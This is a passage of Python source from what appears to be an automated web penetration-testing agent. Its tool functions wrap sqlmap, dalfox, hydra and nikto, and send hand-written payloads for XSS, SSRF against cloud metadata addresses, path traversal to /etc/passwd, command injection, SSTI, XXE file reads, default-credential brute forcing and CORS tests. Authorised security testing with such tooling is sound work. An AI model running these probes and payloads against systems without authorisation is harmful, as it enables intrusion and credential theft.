        lines.append(_run(f"wafw00f {_safe_url(url)} 2>&1", timeout=20))
    return "\n".join(lines)


def tool_directory_scan(url: str, wordlist: str = "common", extensions: str = "", **_) -> str:
    # Resolve wordlist
    wl_map = {
        "common":  "/usr/share/wordlists/dirb/common.txt",
        "big":     "/usr/share/wordlists/dirb/big.txt",
        "medium":  "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
    }
    wl_path = wl_map.get(wordlist, wordlist)
    if not Path(wl_path).exists():
        wl_path = "/usr/share/wordlists/dirb/common.txt"
    if not Path(wl_path).exists():
        wl_path = ""

    if not wl_path:
        return "[!] No wordlist found. Install dirb: apt install dirb"

    ext_flag = f"-x {shlex.quote(extensions)}" if extensions else ""

    if shutil.which("gobuster"):
        cmd = (
            f"gobuster dir -u {_safe_url(url)} -w {shlex.quote(wl_path)} "
            f"{ext_flag} -t 20 -q --no-error 2>&1"
        )
        return f"=== gobuster ===\n{_run(cmd, timeout=120)}"

    if shutil.which("ffuf"):
        ext_part = ""
        if extensions:
            exts = ",".join(f".{e.strip()}" for e in extensions.split(","))
            ext_part = f"-e {shlex.quote(exts)}"
        cmd = (
            f"ffuf -u {_safe_url(url)}/FUZZ -w {shlex.quote(wl_path)} "
            f"{ext_part} -mc 200,301,302,403 -t 20 -s 2>&1"
        )
        return f"=== ffuf ===\n{_run(cmd, timeout=120)}"

    if shutil.which("dirb"):
        cmd = f"dirb {_safe_url(url)} {shlex.quote(wl_path)} -S -r 2>&1"
        return f"=== dirb ===\n{_run(cmd, timeout=120)}"

    return "[!] No directory scanner found. Install: apt install gobuster ffuf dirb"


def tool_check_security_headers(url: str, **_) -> str:
    cf = _curl_flags()
    raw = _run(f"curl {cf} -sI --max-time 15 {_safe_url(url)}")

    important_headers = [
        ("Strict-Transport-Security", "HSTS"),
        ("Content-Security-Policy", "CSP"),
        ("X-Frame-Options", "Clickjacking protection"),
        ("X-Content-Type-Options", "MIME sniffing protection"),
        ("Referrer-Policy", "Referrer control"),
        ("Permissions-Policy", "Feature policy"),
        ("X-XSS-Protection", "XSS filter (legacy)"),
        ("Access-Control-Allow-Origin", "CORS"),
    ]

    raw_lower = raw.lower()
    results = ["=== Security Headers Analysis ===", "", "Raw headers:", raw, "", "Analysis:"]

    present = []
    missing = []
    for header, desc in important_headers:
        if header.lower() in raw_lower:
            present.append(f"  [+] PRESENT  {header} ({desc})")
        else:
            missing.append(f"  [-] MISSING  {header} ({desc})")

    results.extend(present)
    results.extend(missing)

    if missing:
        results.append(f"\n[!] {len(missing)} security headers missing - potential misconfiguration")
    else:
        results.append("\n[+] All key security headers present")

    return "\n".join(results)


def tool_find_sensitive_files(url: str, **_) -> str:
    cf = _curl_flags()
    base = url.rstrip("/")
    paths = [
        "/.env", "/.env.local", "/.env.production", "/.env.backup",
        "/.git/config", "/.git/HEAD", "/.gitignore",
        "/backup.sql", "/backup.zip", "/backup.tar.gz", "/db.sql",
        "/config.php", "/config.yml", "/config.json", "/settings.py",
        "/web.config", "/app.config", "/application.properties",
        "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
        "/.DS_Store", "/phpinfo.php", "/info.php", "/test.php",
        "/admin", "/admin.php", "/admin/", "/administrator/",
        "/wp-config.php", "/wp-login.php",
        "/api/swagger.json", "/swagger.json", "/openapi.json", "/api-docs",
        "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
        "/server-status", "/server-info",
    ]

    # Parallel probe - all paths simultaneously (35 seq × 12s → ~8s total)
    from concurrent.futures import ThreadPoolExecutor, as_completed

    def _probe(p):
        t = base + p
        code = _run(
            f"curl {cf} -o /dev/null -w '%{{http_code}}' --max-time 5 {shlex.quote(t)}",
            timeout=8,
        ).strip()
        return p, t, code

    found = []
    errors = []
    with ThreadPoolExecutor(max_workers=15) as ex:
        futures = {ex.submit(_probe, p): p for p in paths}
        for fut in as_completed(futures):
            p, t, code = fut.result()
            if code in ("200", "301", "302", "403"):
                found.append(f"  [{code}] {t}")
            elif code not in ("404", "400", "000", ""):
                errors.append(f"  [???] {t} (HTTP {code})")

    result = ["=== Sensitive File Probe ===", ""]
    if found:
        result.append(f"[!] {len(found)} interesting paths found:")
        result.extend(sorted(found))
    else:
        result.append("[+] No common sensitive files found publicly accessible")
    if errors:
        result.append(f"\nUnexpected responses ({len(errors)}):")
        result.extend(errors[:10])
    return "\n".join(result)


def tool_test_sql_injection(url: str, data: str = "", level: int = 1, **_) -> str:
    if not shutil.which("sqlmap"):
        return "[!] sqlmap not found. Install: pip install sqlmap or apt install sqlmap"
    cf_cookies = ""
    cookies = SESSION.get("cookies", "")
    if cookies:
        cf_cookies = f"--cookie={shlex.quote(cookies)}"
    proxy_flag = ""
    proxy = SESSION.get("proxy", "")
    if proxy:
        proxy_flag = f"--proxy={shlex.quote(proxy)}"
    data_flag = f"--data={shlex.quote(data)}" if data else ""
    # Focus sqlmap on the parameters actually present in the URL query so it
    # doesn't waste the budget probing unrelated inputs. Skip the time-based
    # technique (T) by default: its sleep-based payloads take 10s+ each and blow
    # the wall-clock on remote targets before faster techniques even run.
    import urllib.parse
    q_params = list(urllib.parse.parse_qs(urllib.parse.urlparse(url).query).keys())
    p_flag = f"-p {shlex.quote(','.join(q_params))}" if q_params and not data else ""
    cmd = (
        f"sqlmap -u {_safe_url(url)} {data_flag} {p_flag} {cf_cookies} {proxy_flag} "
        f"--batch --level={level} --risk=1 --technique=BEUS --threads=4 "
        f"--timeout=15 --retries=1 --output-dir=/tmp/sqlmap_ws 2>&1"
    )
    return f"=== sqlmap ===\n{_run(cmd, timeout=240)}"


def _dalfox_pacing() -> tuple[int, int]:
    """Worker count and per-request delay for dalfox, honouring the engagement.

    dalfox does its own HTTP, so `--rps` cannot reach it through utils.http. The
    cap is translated here instead: ignoring it would let one tool blow the rate
    limit the rest of the run respects, which is how researchers get banned.
    """
    try:
        # Same source utils.http reads, so --rps governs every tool alike.
        rps = float(os.environ.get("YEEPFORGE_RPS", 10.0))
    except (TypeError, ValueError):
        rps = 10.0
    if rps <= 0:                       # explicitly unlimited: still stay civil
        return 8, 50
    workers = max(1, min(8, int(rps)))
    return workers, max(1, int(1000 / rps))


def tool_test_xss(url: str, **_) -> str:
    cf = _curl_flags()
    results = ["=== XSS Testing ==="]

    if shutil.which("dalfox"):
        # Concurrency here is a correctness problem, not just a courtesy one:
        # at 50 workers a modest IIS target refused connections faster than
        # dalfox could retry, so every request died on i/o timeout and the scan
        # produced nothing at all. Fewer workers with a delay finishes; a flood
        # does not. --skip-bav and --skip-mining-dict drop the side scans that
        # dominate the runtime without testing the parameters we came for.
        workers, delay_ms = _dalfox_pacing()
        cmd = (f"dalfox url {_safe_url(url)} --silence "
               f"--worker={shlex.quote(str(workers))} "
               f"--delay {shlex.quote(str(delay_ms))} "
               f"--timeout 10 --skip-bav --skip-mining-dict 2>&1")
        results.append("--- dalfox ---")
        out = _run(cmd, timeout=300)
        results.append(out)
        if "timed out" in out.lower() or "i/o timeout" in out.lower():
            results.append(
                "[!] dalfox did not finish - treat XSS as UNTESTED on this URL, "
                "not as clean. Re-run against a single parameter to narrow it."
            )
        return "\n".join(results)

    # Manual basic payloads
    payloads = [
        "<script>alert(1)</script>",
        '"><script>alert(1)</script>',
        "'><img src=x onerror=alert(1)>",
        "<img src=x onerror=alert`1`>",
        "javascript:alert(1)",
    ]
    results.append("--- Manual XSS probes ---")
    for payload in payloads:
        encoded = shlex.quote(payload)
        test_url = f"{url}?q={encoded}"
        out = _run(
            f"curl {cf} -s --max-time 8 {shlex.quote(test_url)} 2>&1 | head -50",
            timeout=12,
        )
        if payload.replace('"', '').replace("'", '') in out or "alert" in out.lower():
            results.append(f"  [!] POSSIBLE XSS reflected: {payload}")
        else:
            results.append(f"  [ ] Not reflected: {payload[:40]}")
    return "\n".join(results)


def tool_test_ssrf(url: str, param: str = "url", **_) -> str:
    cf = _curl_flags()
    base = url.rstrip("/")
    targets = [
        ("127.0.0.1",          "localhost"),
        ("127.0.0.1:80",       "localhost:80"),
        ("127.0.0.1:8080",     "localhost:8080"),
        ("169.254.169.254",    "AWS/GCP metadata"),
        ("169.254.169.254/latest/meta-data/", "AWS metadata path"),
        ("metadata.google.internal", "GCP metadata"),
        ("100.100.100.200",    "Alibaba metadata"),
    ]
    results = ["=== SSRF Testing ==="]
    for target_addr, label in targets:
        test_url = f"{base}?{param}=http://{target_addr}"
        out = _run(
            f"curl {cf} -s --max-time 6 {shlex.quote(test_url)} 2>&1 | head -30",
            timeout=10,
        )
        indicators = ["ami-id", "instance-id", "meta-data", "hostname", "local-ipv4",
                      "computeMetadata", "serviceAccounts", "root:x:", "uid="]
        if any(ind in out for ind in indicators):
            results.append(f"  [!!!] SSRF CONFIRMED via {label}: {test_url}")
        elif out and "(no output)" not in out and len(out) > 20:
            results.append(f"  [?] Response from {label} ({len(out)} bytes) - investigate")
        else:
            results.append(f"  [ ] No SSRF via {label}")
    return "\n".join(results)


def tool_test_path_traversal(url: str, param: str = "file", **_) -> str:
    cf = _curl_flags()
    base = url.rstrip("/")
    payloads = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "/etc/passwd",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    ]
    results = ["=== Path Traversal Testing ==="]
    for payload in payloads:
        test_url = f"{base}?{param}={payload}"
        out = _run(
            f"curl {cf} -s --max-time 8 {shlex.quote(test_url)} 2>&1 | head -20",
            timeout=12,
        )
        if "root:" in out or "daemon:" in out or "bin/bash" in out or "[boot loader]" in out:
            results.append(f"  [!!!] PATH TRAVERSAL CONFIRMED: {payload}")
            results.append(f"        Evidence: {out[:200]}")
        else:
            results.append(f"  [ ] {payload[:50]}")
    return "\n".join(results)


def tool_test_command_injection(url: str, param: str = "cmd", **_) -> str:
    cf = _curl_flags()
    base = url.rstrip("/")
    payloads = [
        (";id",              "semicolon injection"),
        ("|id",              "pipe injection"),
        ("$(id)",            "subshell injection"),
        ("`id`",             "backtick injection"),
        ("&&id",             "AND injection"),
        (";sleep 5",         "time-based blind (sleep 5)"),
        ("|sleep 5",         "time-based blind pipe"),
        ("\nid\n",           "newline injection"),
    ]
    results = ["=== Command Injection Testing ==="]
    for payload, label in payloads:
        test_url = f"{base}?{param}={shlex.quote(payload)}"
        t0 = time.time()
        out = _run(
            f"curl {cf} -s --max-time 10 {shlex.quote(test_url)} 2>&1",
            timeout=15,
        )
        elapsed = time.time() - t0
        if "uid=" in out and "gid=" in out:
            results.append(f"  [!!!] COMMAND INJECTION CONFIRMED via {label}")
            results.append(f"        Output: {out[:200]}")
        elif "sleep" in label and elapsed > 4.5:
            results.append(f"  [!!] Possible blind injection via {label} (elapsed: {elapsed:.1f}s)")
        else:
            results.append(f"  [ ] {label}")
    return "\n".join(results)


def tool_test_authentication(url: str, test_type: str = "default_creds",
                              endpoint: str = "", username_param: str = "username",
                              password_param: str = "password", **_) -> str:
    cf = _curl_flags()
    base = url.rstrip("/")
    login_path = endpoint or "/login"
    login_url = base + login_path if not endpoint.startswith("http") else endpoint

    results = [f"=== Authentication Testing ({test_type}) ==="]

    if test_type == "default_creds":
        creds = [
            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
            ("admin", "admin123"), ("root", "root"), ("root", "toor"),
            ("admin", ""), ("administrator", "administrator"),
            ("guest", "guest"), ("test", "test"), ("user", "user"),
        ]
        results.append(f"Testing {len(creds)} default credential pairs (parallel) against {login_url}")
        success_indicators = ["dashboard", "logout", "welcome", "profile", "token", "Bearer"]
        fail_indicators    = ["invalid", "incorrect", "wrong", "failed", "error", "denied"]

        from concurrent.futures import ThreadPoolExecutor, as_completed

        def _try_cred(user, passwd):
            data = f"{username_param}={shlex.quote(user)}&{password_param}={shlex.quote(passwd)}"
            out = _run(
                f"curl {cf} -s -X POST {shlex.quote(login_url)} "
                f"-d {shlex.quote(data)} -w '\\nHTTP:%{{http_code}}' --max-time 6 2>&1",
                timeout=10,
            )
            return user, passwd, out

        with ThreadPoolExecutor(max_workers=5) as ex:
            futures = [ex.submit(_try_cred, u, p) for u, p in creds]
            for fut in as_completed(futures):
                user, passwd, out = fut.result()
                if any(s.lower() in out.lower() for s in success_indicators):
                    results.append(f"  [!!!] DEFAULT CREDS WORK: {user}:{passwd}")
                elif "HTTP:200" in out and not any(f.lower() in out.lower() for f in fail_indicators):
                    results.append(f"  [?] Possible success {user}:{passwd} - verify manually")
                else:
                    results.append(f"  [ ] {user}:{passwd}")

    elif test_type == "jwt":
        results.append("JWT analysis - checking for weak signing, none algorithm, etc.")
        out = _run(
            f"curl {cf} -sI --max-time 10 {shlex.quote(login_url)} 2>&1",
            timeout=15,
        )
        if "authorization" in out.lower() or "bearer" in out.lower():
            results.append("  [*] JWT/Bearer auth detected in headers")
        if "eyJ" in out:
            results.append("  [*] JWT token found in response - test with jwt_tool or manual decode")
        results.append(out[:500])

    elif test_type == "lockout":
        results.append("Testing account lockout policy (10 rapid attempts)")
        for i in range(10):
            data = f"{username_param}=admin&{password_param}=wrong{i}"
            out = _run(
                f"curl {cf} -s -X POST {shlex.quote(login_url)} "
                f"-d {shlex.quote(data)} -w '\\nHTTP:%{{http_code}}' --max-time 8 2>&1",
                timeout=12,
            )
            if "locked" in out.lower() or "429" in out or "too many" in out.lower():
                results.append(f"  [+] Lockout triggered after {i+1} attempts")
                break
        else:
            results.append("  [!] No lockout detected after 10 attempts - possible brute force risk")

    elif test_type == "brute_force":
        if shutil.which("hydra"):
            cmd = (
                f"hydra -l admin -P /usr/share/wordlists/rockyou.txt "
                f"{shlex.quote(login_url)} http-post-form "
                f"'{login_path}:{username_param}=^USER^&{password_param}=^PASS^:F=invalid' "
                f"-t 4 -f -V 2>&1 | head -40"
            )
            results.append(_run(cmd, timeout=60))
        else:
            results.append("[!] hydra not found. Skipping brute force.")

    return "\n".join(results)


def tool_scan_vulnerabilities(url: str, **_) -> str:
    if shutil.which("nikto"):
        proxy_flag = ""
        proxy = SESSION.get("proxy", "")
        if proxy:
            proxy_flag = f"-useproxy {shlex.quote(proxy)}"
        cmd = f"nikto -h {_safe_url(url)} {proxy_flag} -maxtime 90 -Format txt 2>&1"
        return f"=== nikto ===\n{_run(cmd, timeout=100)}"

    # Manual fallback checks
    cf = _curl_flags()
    results = ["=== Manual Vulnerability Checks (nikto not available) ==="]
    checks = [
        (f"curl {cf} -sX TRACE --max-time 8 {_safe_url(url)}", "TRACE method"),
        (f"curl {cf} -sX OPTIONS --max-time 8 {_safe_url(url)}", "OPTIONS method"),
        (f"curl {cf} -sI --max-time 8 {_safe_url(url)}/NONEXISTENT_PAGE_404", "Error page info leak"),
    ]
    for cmd, label in checks:
        out = _run(cmd, timeout=12)
        results.append(f"\n--- {label} ---\n{out[:300]}")
    return "\n".join(results)


def tool_check_ssl_tls(host: str, **_) -> str:
    # Strip protocol if provided
    host = re.sub(r'^https?://', '', host).rstrip("/")

    if shutil.which("sslscan"):
        return f"=== sslscan ===\n{_run(f'sslscan --no-colour {shlex.quote(host)} 2>&1', timeout=60)}"

    if shutil.which("nmap"):
        parts = host.split(":")
        h = parts[0]
        port = parts[1] if len(parts) > 1 else "443"
        cmd = (
            f"nmap --script ssl-enum-ciphers,ssl-heartbleed,ssl-poodle "
            f"-p {shlex.quote(port)} {shlex.quote(h)} 2>&1"
        )
        return f"=== nmap ssl scripts ===\n{_run(cmd, timeout=60)}"

    if shutil.which("testssl.sh") or shutil.which("testssl"):
        binary = "testssl.sh" if shutil.which("testssl.sh") else "testssl"
        return f"=== testssl ===\n{_run(f'{binary} {shlex.quote(host)} 2>&1', timeout=90)}"

    # openssl fallback
    cmd = (
        f"openssl s_client -connect {shlex.quote(host if ':' in host else host + ':443')} "
        f"</dev/null 2>&1 | head -40"
    )
    return f"=== openssl (basic) ===\n{_run(cmd, timeout=20)}"


def tool_test_ssti(url: str, param: str = "q", **_) -> str:
    cf = _curl_flags()
    base = url.rstrip("/")
    payloads = [
        ("{{7*7}}",          "Jinja2/Twig"),
        ("${7*7}",           "FreeMarker/Velocity"),
        ("#{7*7}",           "Ruby ERB"),
        ("<%= 7*7 %>",       "ERB/EJS"),
        ("{{7*'7'}}",        "Jinja2 string multiply"),
        ("${{7*7}}",         "Angular/Thymeleaf"),
        ("{7*7}",            "Smarty"),
        ("@(7*7)",           "Razor"),
        ("*{7*7}",           "Thymeleaf"),
    ]
    results = ["=== SSTI Testing ==="]
    for payload, engine in payloads:
        test_url = f"{base}?{param}={shlex.quote(payload)}"
        out = _run(
            f"curl {cf} -s --max-time 8 {shlex.quote(test_url)} 2>&1",
            timeout=12,
        )
        # Check for 49 (7*7) in response
        if "49" in out:
            results.append(f"  [!!!] SSTI CONFIRMED ({engine}): payload={payload}")
            results.append(f"        Response snippet: {out[:200]}")
        else:
            results.append(f"  [ ] {engine}: {payload[:30]}")
    return "\n".join(results)


def tool_report_finding(title: str, severity: str, description: str,
                         owasp: str = "", url: str = "", remediation: str = "", **_) -> str:
    target_url = url or SESSION.get("target_url", "")
    # One finding, one store. Writing to both `vulns_found` and `findings` put
    # the same issue in the report twice - and since add_finding took no URL,
    # the second copy was placeless and survived deduplication as its own row.
    add_vuln(title, severity, owasp, description, target_url,
             remediation=remediation)
    msg = (
        f"[FINDING RECORDED]\n"
        f"  Title:       {title}\n"
        f"  Severity:    {severity}\n"
        f"  OWASP:       {owasp or 'N/A'}\n"
        f"  URL:         {target_url}\n"
        f"  Description: {description[:200]}\n"
        f"  Remediation: {remediation[:200] if remediation else 'N/A'}"
    )
    return msg


def tool_finish_assessment(summary: str, **_) -> str:
    return f"ASSESSMENT_DONE\n{summary}"


def tool_analyze_source_code(code_path: str, skill: str = "all", **_) -> str:
    """
    Run SAST analysis on a source code directory.
    Integrates the full SAST module (15 AI skills) into the agent loop.
    """
    import os
    if not code_path or not os.path.isdir(code_path):
        # Try session default
        code_path = SESSION.get("sast_target", "")
        if not code_path or not os.path.isdir(code_path):
            return (
                "ERROR: No valid code directory found. "
                "Set sast_target in session or provide an absolute path. "
                "Example: /home/user/myapp"
            )

    try:
        from modules.sast import (
            SKILL_META,
            _call_claude,
            _get_client,
            _load_skill,
            _read_codebase,
            _sast_dir,
        )
    except ImportError as e:
        return f"SAST module import error: {e}"

    SESSION["sast_target"] = code_path
    sast_d = _sast_dir(code_path)

    # Determine which skills to run
    skill_order = [
        "sast-analysis",
        "sast-sqli", "sast-xss", "sast-ssrf", "sast-rce", "sast-xxe",
        "sast-pathtraversal", "sast-ssti", "sast-jwt", "sast-idor",
        "sast-missingauth", "sast-businesslogic", "sast-graphql",
        "sast-fileupload", "sast-report",
    ]

    skill_map = {
        "architecture": ["sast-analysis"],
        "sqli":         ["sast-analysis", "sast-sqli"],
        "xss":          ["sast-analysis", "sast-xss"],
        "ssrf":         ["sast-analysis", "sast-ssrf"],
        "rce":          ["sast-analysis", "sast-rce"],
        "xxe":          ["sast-analysis", "sast-xxe"],
        "pathtraversal":["sast-analysis", "sast-pathtraversal"],
        "ssti":         ["sast-analysis", "sast-ssti"],
        "jwt":          ["sast-analysis", "sast-jwt"],
        "idor":         ["sast-analysis", "sast-idor"],
        "missingauth":  ["sast-analysis", "sast-missingauth"],
        "businesslogic":["sast-analysis", "sast-businesslogic"],
        "graphql":      ["sast-analysis", "sast-graphql"],
        "report":       ["sast-report"],
        "all":          skill_order,
    }

    skills_to_run = skill_map.get(skill.lower(), skill_order)

    # Get AI client (reuse agent's backend)
    client, backend_label = _get_client()

    results_summary = []
    findings_found = 0
    import re

    for skill_key in skills_to_run:
        label, owasp, results_file = SKILL_META[skill_key]
        out_path = sast_d / results_file

        # Skip if already done
        if out_path.exists():
            content = out_path.read_text()
            vuln_count = len(re.findall(r"\[VULNERABLE\]", content))
            likely_count = len(re.findall(r"\[LIKELY VULNERABLE\]", content))
            results_summary.append(
                f"  {label}: {vuln_count} VULNERABLE, {likely_count} LIKELY (cached)"
            )
            findings_found += vuln_count + likely_count
            continue

        skill_instruction = _load_skill(skill_key)
        if not skill_instruction:
            continue

        # Build context
        if skill_key == "sast-report":
            existing = []
            for sk, (_, _, rf) in SKILL_META.items():
                fp = sast_d / rf
                if fp.exists() and rf != "final-report.md":
                    existing.append(f"\n## {rf}\n{fp.read_text()[:3000]}\n")
            arch_f = sast_d / "architecture.md"
            arch = arch_f.read_text() if arch_f.exists() else ""
            codebase_ctx = f"## architecture.md\n{arch}\n\n" + "".join(existing)
        else:
            arch_f = sast_d / "architecture.md"
            arch_ctx = f"\n## Architecture\n{arch_f.read_text()}\n\n" if (
                arch_f.exists() and skill_key != "sast-analysis"
            ) else ""

            # Read codebase (priority files only for speed)
            from modules.sast import _read_codebase
            codebase = _read_codebase(code_path, max_bytes=80_000)
            codebase_ctx = arch_ctx + f"## Source Code\n{codebase}"

        system_prompt = (
            f"You are an expert SAST security engineer. Follow the methodology precisely.\n\n"
            f"SKILL:\n{skill_instruction}\n\n"
            f"Output ONLY the findings document (Markdown). No preamble.\n"
            f"Use exact output format from the skill instructions.\n"
        )
        user_msg = (
            f"Analyze this codebase for {label} vulnerabilities.\n\n{codebase_ctx}"
        )

        result_text = _call_claude(client, system_prompt, user_msg, label=label)

        # Save result
        out_path.write_text(result_text)

        # Count findings
        vuln_count   = len(re.findall(r"\[VULNERABLE\]", result_text))
        likely_count = len(re.findall(r"\[LIKELY VULNERABLE\]", result_text))
        findings_found += vuln_count + likely_count

        results_summary.append(
            f"  {label}: {vuln_count} VULNERABLE, {likely_count} LIKELY"
        )

        # Record in session
        if vuln_count > 0:
            add_vuln(f"[SAST] {label} vulnerabilities", "High", owasp,
                     f"{vuln_count} confirmed vulnerabilities in source code", code_path)

    # Build summary
    summary = (
        f"SAST Analysis complete for: {code_path}\n"
        f"Skills run: {len(skills_to_run)}\n"
        f"Total findings: {findings_found}\n\n"
        f"Results by skill:\n" + "\n".join(results_summary) + "\n\n"
        f"Detailed results saved to: {sast_d}\n"
    )
    if findings_found > 0:
        summary += (
            f"\nFINDINGS DETECTED - recommend running report skill:\n"
            f"  analyze_source_code(code_path='{code_path}', skill='report')"
        )
    return summary


#: href values that are not locations. Joining one onto the base host invents an
#: endpoint that was never there - an ASP.NET page full of
#: href="javascript:__doPostBack(...)" otherwise yields a page of phantom URLs.
_PSEUDO_SCHEMES = ("javascript:", "mailto:", "tel:", "data:", "about:",
                   "blob:", "file:", "sms:", "callto:", "#")


def _is_pseudo_url(raw: str) -> bool:
    return raw.strip().lower().startswith(_PSEUDO_SCHEMES)


def tool_crawl_target(url: str, depth: int = 2, **_) -> str:
    """Crawl target and populate SESSION with discovered endpoints, forms, JS routes."""
    cf = _curl_flags()
    base = url.rstrip("/")
    results = [f"=== Crawl: {url} (depth={depth}) ==="]

    discovered = set()

    def _fetch_and_parse(target_url: str):
        out = _run(f"curl {cf} -sL --max-time 15 {shlex.quote(target_url)}", timeout=20)
        # Links
        links = re.findall(r'href=["\']([^"\'#\s]{3,})["\']', out, re.I)
        # Form actions
        forms = re.findall(r'action=["\']([^"\'#\s]{3,})["\']', out, re.I)
        # JS API paths
        js_paths = re.findall(r'"(/(?:api|v\d|graphql)[^"\s]{0,80})"', out)
        return [lnk for lnk in links + forms + js_paths if not _is_pseudo_url(lnk)], out

    # Level 1: homepage
    links_l1, page_src = _fetch_and_parse(base)
    for link in links_l1:
        if link.startswith("http"):
            if base.split("//")[1].split("/")[0] in link:
                discovered.add(link)
        elif link.startswith("/"):
            discovered.add(base + link)
        else:
            discovered.add(base + "/" + link)

    # Check robots.txt and sitemap
    for special in ["/robots.txt", "/sitemap.xml", "/sitemap_index.xml"]:
        out = _run(f"curl {cf} -sL --max-time 8 {shlex.quote(base + special)}", timeout=12)
        if "200" in _run(f"curl {cf} -o /dev/null -w '%{{http_code}}' --max-time 5 {shlex.quote(base + special)}", timeout=8):
            discovered.add(base + special)
            more = re.findall(r'(?:Disallow|Allow|<loc>)\s*:?\s*([/a-zA-Z0-9._\-?=&%]{2,})', out)
            for m in more:
                discovered.add(base + (m if m.startswith("/") else "/" + m))

    # Level 2: parallel link following
    if depth >= 2:
        from concurrent.futures import ThreadPoolExecutor
        to_visit = [lnk for lnk in list(discovered)[:15] if lnk.startswith(base)]

        def _follow(lnk):
            sub, _ = _fetch_and_parse(lnk)
            return sub

        with ThreadPoolExecutor(max_workers=6) as ex:
            for sub_links in ex.map(_follow, to_visit):
                for sl in sub_links:
                    full = base + sl if sl.startswith("/") else sl
                    if full.startswith(base):
                        discovered.add(full)

    # Detect key endpoint types
    login_eps   = [e for e in discovered if any(x in e.lower() for x in ["/login", "/signin", "/auth"])]
    admin_eps   = [e for e in discovered if any(x in e.lower() for x in ["/admin", "/dashboard", "/manage"])]
    api_eps     = [e for e in discovered if any(x in e.lower() for x in ["/api/", "/v1/", "/v2/", "/graphql"])]
    upload_eps  = [e for e in discovered if any(x in e.lower() for x in ["/upload", "/file", "/attach", "/media"])]

    # Store in session
    SESSION["agent_endpoints"] = list(discovered)[:200]
    if login_eps:   SESSION["agent_login_ep"] = login_eps[0]
    if upload_eps:  SESSION["agent_upload_endpoints"] = upload_eps[:5]

    results.append(f"\nTotal discovered: {len(discovered)} endpoints")
    if login_eps:   results.append(f"Login pages: {login_eps[:3]}")
    if admin_eps:   results.append(f"Admin panels: {admin_eps[:3]}")
    if api_eps:     results.append(f"API endpoints: {api_eps[:5]}")
    if upload_eps:  results.append(f"Upload endpoints: {upload_eps[:3]}")
    results.append("\nAll paths:")
    for ep in sorted(discovered)[:60]:
        results.append(f"  {ep}")
    if len(discovered) > 60:
        results.append(f"  ... and {len(discovered)-60} more")

    return "\n".join(results)


def tool_test_cors(url: str, **_) -> str:
    """Test for CORS misconfiguration - reflected origin, credentials, null origin."""
    cf = _curl_flags()
    results = ["=== CORS Misconfiguration Testing ==="]
    base = url.rstrip("/")

    test_origin = "https://evil.hacker.com"
    null_origin = "null"

    test_cases = [
        (test_origin,    "Arbitrary origin reflection"),
        (null_origin,    "Null origin"),
        (f"https://{base.split('//')[-1].split('/')[0]}.evil.com", "Domain suffix bypass"),
    ]

    # Also test API endpoints
    test_urls = [base] + [base + p for p in ["/api/user", "/api/me", "/api/profile", "/api/data"]]

    for test_url in test_urls[:3]:
        for origin, label in test_cases:
            out = _run(
                f"curl {cf} -sI --max-time 8 "
                f"-H 'Origin: {origin}' "
                f"{shlex.quote(test_url)} 2>&1",
                timeout=12,
            )
            out_lower = out.lower()
            acao = re.search(r'access-control-allow-origin:\s*(.+)', out, re.I)
            acac = re.search(r'access-control-allow-credentials:\s*(.+)', out, re.I)

            if acao:
                acao_val = acao.group(1).strip()
                acac_val = (acac.group(1).strip() if acac else "").lower()

                if origin in acao_val and "true" in acac_val:
                    results.append("\n  [CRITICAL] CORS: Origin reflected + Credentials=true!")
                    results.append(f"    URL: {test_url}")
                    results.append(f"    Test: {label} (origin={origin})")
                    results.append(f"    ACAO: {acao_val}  ACAC: {acac_val}")
                    add_vuln("CORS Misconfiguration - Credentials Exposed", "Critical", "A05:2021",
                             f"Origin '{origin}' reflected with Access-Control-Allow-Credentials: true at {test_url}",
                             test_url)
                elif origin in acao_val or acao_val == "*":
                    results.append("\n  [HIGH] CORS: Origin reflected (no credentials)")
                    results.append(f"    URL: {test_url}  Test: {label}")
                    results.append(f"    ACAO: {acao_val}")
                    if acao_val != "*":
                        add_vuln("CORS Origin Reflected", "High", "A05:2021",
                                 f"Arbitrary origin reflected at {test_url}", test_url)
                else:
                    results.append(f"  [ ] {label}: ACAO={acao_val} (origin not reflected)")
            else:
                results.append(f"  [ ] {label}: No ACAO header at {test_url}")

    return "\n".join(results)


def tool_test_xxe(url: str, endpoint: str = "", **_) -> str:
    """Test for XXE injection via XML POST requests."""
    cf = _curl_flags()
    base = url.rstrip("/")
    results = ["=== XXE Injection Testing ==="]

    # Common XML endpoints
    xml_endpoints = []
    if endpoint:
        xml_endpoints.append(base + endpoint if not endpoint.startswith("http") else endpoint)
    xml_endpoints += [
        base, base + "/api/upload", base + "/upload", base + "/api/xml",
        base + "/api/parse", base + "/soap", base + "/api/import",
    ]
    # Also check discovered endpoints for XML-related paths
    for ep in SESSION.get("agent_endpoints", []):
        if any(x in ep.lower() for x in ["xml", "soap", "upload", "import", "parse"]):
            xml_endpoints.append(ep)

    # XXE payloads
    xxe_payloads = [
        (
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
            "Linux /etc/passwd",
            ["root:x:", "daemon:", "/bin/bash"]
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><test>&xxe;</test>',
            "Windows win.ini",
            ["[fonts]", "[extensions]", "for 16-bit"]
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><test>&xxe;</test>',
            "/etc/hostname",
            ["localhost", "server"]
        ),
    ]

    content_types = ["application/xml", "text/xml"]

    for ep in xml_endpoints[:5]:
        for payload, label, indicators in xxe_payloads:
            for ct in content_types:
                out = _run(
                    f"curl {cf} -s --max-time 10 "
                    f"-X POST "
                    f"-H 'Content-Type: {ct}' "
                    f"-d {shlex.quote(payload)} "
                    f"{shlex.quote(ep)} 2>&1",
                    timeout=15,
                )
                if any(ind in out for ind in indicators):
                    results.append("\n  [CRITICAL] XXE CONFIRMED!")
                    results.append(f"    Endpoint: {ep}")
